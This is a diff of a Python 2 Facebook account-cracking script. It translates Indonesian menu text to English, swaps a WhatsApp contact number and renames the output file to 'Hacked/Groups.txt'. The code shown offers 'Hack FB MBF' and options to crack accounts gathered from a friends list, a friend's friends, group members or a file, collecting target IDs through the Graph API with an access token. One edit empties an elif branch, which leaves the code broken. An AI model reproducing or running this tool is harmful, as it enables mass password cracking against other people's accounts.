@@ -95,10 +95,10 @@ while (loop == 'true'):
             loop = 'false'
         else:
             print "yang bener dong"
-            os.system('xdg-open https://wa.me/6285691015635')
+            os.system('xdg-open https://wa.me/8801884599429')
     else:
         print "salah sayang!"
-        os.system('xdg-open https://wa.me/6285691015635')
+        os.system('xdg-open https://wa.me/8801884599429')
 
 def login():
 	os.system('clear')
@@ -151,7 +151,7 @@ def login():
 			time.sleep(1)
 			keluar()
 		else:
-			print("\n\033[1;96m[!] \x1b[1;91mPassword/Email salah")
+			print("\n\033[1;96m[!] \x1b[1;91mPassword/Email is wrong")
 			os.system('rm -rf login.txt')
 			time.sleep(1)
 			login()
@@ -174,35 +174,35 @@ def menu():
 		id = a['id']
 	except KeyError:
 		os.system('clear')
-		print"\033[1;96m[!] \033[1;91mSepertinya akun anda kena checkpoint"
+		print"\033[1;96m[!] \033[1;91mIt looks like your account has a checkpoint"
 		os.system('rm -rf login.txt')
 		time.sleep(1)
 		login()
 	except requests.exceptions.ConnectionError:
-		print"\033[1;96m[!] \x1b[1;91mTidak ada koneksi"
+		print"\033[1;96m[!] \x1b[1;91mThere is no connection"
 		keluar()
 	os.system("clear")
 	print logo
 	print 42*"\033[1;96m="
-	print "\033[1;96m[\033[1;97m✓\033[1;96m]\033[1;93m Nama \033[1;91m: \033[1;92m"+nama+"\033[1;97m               "
+	print "\033[1;96m[\033[1;97m✓\033[1;96m]\033[1;93m Name \033[1;91m: \033[1;92m"+nama+"\033[1;97m               "
 	print "\033[1;96m[\033[1;97m✓\033[1;96m]\033[1;93m ID   \033[1;91m: \033[1;92m"+id+"\x1b[1;97m              "
 	print 42*"\033[1;96m="
-	print "\x1b[1;96m[\x1b[1;92m1\x1b[1;96m]\x1b[1;93m Hack Fb MBF"
-	print "\x1b[1;96m[\x1b[1;92m2\x1b[1;96m]\x1b[1;93m Lihat daftar grup               "
+	print "\x1b[1;96m[\x1b[1;92m1\x1b[1;96m]\x1b[1;93m Hack FB MBF"
+	print "\x1b[1;96m[\x1b[1;92m2\x1b[1;96m]\x1b[1;93m See list of groups               "
 	print "\x1b[1;96m[\x1b[1;92m4\x1b[1;96m]\x1b[1;93m Yahoo clone               "
-	print "\x1b[1;96m[\x1b[1;91m0\x1b[1;96m]\x1b[1;91m Keluar            "
+	print "\x1b[1;96m[\x1b[1;91m0\x1b[1;96m]\x1b[1;91m Exit            "
 	pilih()
 
 
 def pilih():
 	unikers = raw_input("\n\033[1;97m >>> \033[1;97m")
 	if unikers =="":
-		print "\033[1;96m[!] \x1b[1;91mIsi yang benar"
+		print "\033[1;96m[!] \x1b[1;91mFill in correctly"
 		pilih()
 	elif unikers =="1":
 		super()
 	elif unikers =="2":
-		grupsaya()
+		
 	elif unikers =="3":
 		yahoo()
 	elif unikers =="0":
@@ -210,7 +210,7 @@ def pilih():
 		os.system('rm -rf login.txt')
 		keluar()
 	else:
-		print "\033[1;96m[!] \x1b[1;91mIsi yang benar"
+		print "\033[1;96m[!] \x1b[1;91mFill in correctly"
 		pilih()
 
 
@@ -227,23 +227,23 @@ def super():
 	os.system('clear')
 	print logo
 	print 42*"\033[1;96m="
-	print "\x1b[1;96m[\x1b[1;92m1\x1b[1;96m]\x1b[1;93m Crack dari daftar teman"
-	print "\x1b[1;96m[\x1b[1;92m2\x1b[1;96m]\x1b[1;93m Crack dari teman"
-	print "\x1b[1;96m[\x1b[1;92m3\x1b[1;96m]\x1b[1;93m Crack dari member grup"
-	print "\x1b[1;96m[\x1b[1;92m4\x1b[1;96m]\x1b[1;93m Crack dari file"
-	print "\x1b[1;96m[\x1b[1;91m0\x1b[1;96m]\x1b[1;91m Kembali"
+	print "\x1b[1;96m[\x1b[1;92m1\x1b[1;96m]\x1b[1;93m Crack from the friends list"
+	print "\x1b[1;96m[\x1b[1;92m2\x1b[1;96m]\x1b[1;93m Crack from a friend"
+	print "\x1b[1;96m[\x1b[1;92m3\x1b[1;96m]\x1b[1;93m Crack from group member"
+	print "\x1b[1;96m[\x1b[1;92m4\x1b[1;96m]\x1b[1;93m Crack from file"
+	print "\x1b[1;96m[\x1b[1;91m0\x1b[1;96m]\x1b[1;91m Exit"
 	pilih_super()
 
 def pilih_super():
 	peak = raw_input("\n\033[1;97m >>> \033[1;97m")
 	if peak =="":
-		print "\033[1;96m[!] \x1b[1;91mIsi yang benar"
+		print "\033[1;96m[!] \x1b[1;91mFill in correctly"
 		pilih_super()
 	elif peak =="1":
 		os.system('clear')
 		print logo
 		print 42*"\033[1;96m="
-		jalan('\033[1;96m[✺] \033[1;93mMengambil ID \033[1;97m...')
+		jalan('\033[1;96m[✺] \033[1;93mTake ID \033[1;97m...')
 		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
 		z = json.loads(r.text)
 		for s in z['data']:
@@ -252,16 +252,16 @@ def pilih_super():
 		os.system('clear')
 		print logo
 		print 42*"\033[1;96m="
-		idt = raw_input("\033[1;96m[+] \033[1;93mMasukan ID teman \033[1;91m: \033[1;97m")
+		idt = raw_input("\033[1;96m[+] \033[1;93mEnter friend ID \033[1;91m: \033[1;97m")
 		try:
 			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
 			op = json.loads(jok.text)
-			print"\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;93mNama teman\033[1;91m :\033[1;97m "+op["name"]
+			print"\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;93mName friend\033[1;91m :\033[1;97m "+op["name"]
 		except KeyError:
-			print"\033[1;96m[!] \x1b[1;91mTeman tidak ditemukan!"
-			raw_input("\n\033[1;96m[\033[1;97mKembali\033[1;96m]")
+			print"\033[1;96m[!] \x1b[1;91mFriends not found!"
+			raw_input("\n\033[1;96m[\033[1;97mExit\033[1;96m]")
 			super()
-		jalan('\033[1;96m[✺] \033[1;93mMengambil ID \033[1;97m...')
+		jalan('\033[1;96m[✺] \033[1;93mTake ID \033[1;97m...')
 		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
 		z = json.loads(r.text)
 		for i in z['data']:
@@ -270,16 +270,16 @@ def pilih_super():
 		os.system('clear')
 		print logo
 		print 42*"\033[1;96m="
-		idg=raw_input('\033[1;96m[+] \033[1;93mMasukan ID group \033[1;91m:\033[1;97m ')
+		idg=raw_input('\033[1;96m[+] \033[1;93mEnter the ID group \033[1;91m:\033[1;97m ')
 		try:
 			r=requests.get('https://graph.facebook.com/group/?id='+idg+'&access_token='+toket)
 			asw=json.loads(r.text)
-			print"\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;93mNama group \033[1;91m:\033[1;97m "+asw['name']
+			print"\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;93mName group \033[1;91m:\033[1;97m "+asw['name']
 		except KeyError:
-			print"\033[1;96m[!] \x1b[1;91mGroup tidak ditemukan"
-			raw_input("\n\033[1;96m[\033[1;97mKembali\033[1;96m]")
+			print"\033[1;96m[!] \x1b[1;91mGroup not found"
+			raw_input("\n\033[1;96m[\033[1;97mExit\033[1;96m]")
 			super()
-		jalan('\033[1;96m[✺] \033[1;93mMengambil ID \033[1;97m...')
+		jalan('\033[1;96m[✺] \033[1;93mTake ID \033[1;97m...')
 		re=requests.get('https://graph.facebook.com/'+idg+'/members?fields=name,id&limit=999999999&access_token='+toket)
 		s=json.loads(re.text)
 		for p in s['data']:
@@ -289,17 +289,17 @@ def pilih_super():
 		print logo
 		print 42*"\033[1;96m="
 		try:
-			idlist = raw_input('\x1b[1;96m[+] \x1b[1;93mMasukan nama file  \x1b[1;91m: \x1b[1;97m')
+			idlist = raw_input('\x1b[1;96m[+] \x1b[1;93mEnter name file  \x1b[1;91m: \x1b[1;97m')
 			for line in open(idlist,'r').readlines():
 				id.append(line.strip())
 		except IOError:
-			print '\x1b[1;96m[!] \x1b[1;91mFile tidak ditemukan'
-			raw_input('\n\x1b[1;96m[ \x1b[1;97mKembali \x1b[1;96m]')
+			print '\x1b[1;96m[!] \x1b[1;91mFile not found'
+			raw_input('\n\x1b[1;96m[ \x1b[1;97mExit \x1b[1;96m]')
 			super()
 	elif peak =="0":
 		menu()
 	else:
-		print "\033[1;96m[!] \x1b[1;91mIsi yang benar"
+		print "\033[1;96m[!] \x1b[1;91mFill in correctly"
 		pilih_super()
 	
 	print "\033[1;96m[+] \033[1;93mTotal ID \033[1;91m: \033[1;97m"+str(len(id))
@@ -464,16 +464,16 @@ def grupsaya():
 			print "\033[1;96m[\033[1;92mGroup\033[1;96m]\x1b[1;97m "+str(id)+" \x1b[1;96m=>\x1b[1;97m "+str(nama)
 		print 42*"\033[1;96m="
 		print"\033[1;96m[+] \033[1;92mTotal Group \033[1;91m:\033[1;97m %s"%(len(listgrup))
-		print("\033[1;96m[+] \033[1;92mTersimpan \033[1;91m: \033[1;97mout/Grupid.txt")
+		print("\033[1;96m[+] \033[1;92mStored \033[1;91m: \033[1;97mHacked/Groups.txt")
 		f.close()
-		raw_input("\n\033[1;96m[\033[1;97mKembali\033[1;96m]")
+		raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
 		menu()
 	except (KeyboardInterrupt,EOFError):
-		print("\033[1;96m[!] \x1b[1;91mTerhenti")
-		raw_input("\n\033[1;96m[\033[1;97mKembali\033[1;96m]")
+		print("\033[1;96m[!] \x1b[1;91mStalled")
+		raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
 		menu()
 	except KeyError:
-		os.remove('out/Grupid.txt')
+		os.remove('Hacked/Groups.txt')
 		print('\033[1;96m[!] \x1b[1;91mGroup tidak ditemukan')
 		raw_input("\n\033[1;96m[\033[1;97mKembali\033[1;96m]")
 		menu()
